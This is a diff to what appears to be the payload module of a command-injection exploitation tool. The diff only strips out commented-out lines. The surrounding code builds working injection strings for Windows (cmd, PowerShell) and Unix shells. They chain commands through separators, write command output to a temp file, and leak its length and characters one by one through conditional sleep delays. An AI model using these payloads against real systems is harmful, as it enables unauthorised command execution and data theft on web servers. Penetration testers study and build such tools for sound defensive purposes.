@@ -37,7 +37,6 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
@@ -55,21 +54,17 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
-                # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "} " + separator +
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 "sleep " + str(timesec)
@@ -108,7 +103,6 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + ampersand +
@@ -127,12 +121,10 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
@@ -142,7 +134,6 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      # separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -213,7 +204,6 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "do " + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%x'"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -241,11 +231,9 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" > " + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
-                #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 # Use -le for bisection; rewrite the payload each time to keep repeated matches harmless.
                 "if [ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                # "then sleep 0 " + separator +
                 "then sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
@@ -253,7 +241,6 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0 " + separator +
@@ -261,7 +248,6 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
-                #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 # -le (not -eq) makes this bisectable like time-based's length check.
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
@@ -270,7 +256,6 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                 )
-      # separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       cmd = cmd.rstrip()
@@ -307,7 +292,6 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -328,12 +312,10 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
-                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
@@ -343,7 +325,6 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-      # separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -375,7 +356,6 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
@@ -391,12 +371,10 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" + separator +
@@ -441,7 +419,6 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
                 )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -457,12 +434,10 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
@@ -499,7 +474,6 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
@@ -515,12 +489,10 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ord(str(ascii_char))) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0" + separator +
@@ -558,7 +530,6 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -573,12 +544,10 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 "fi"
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
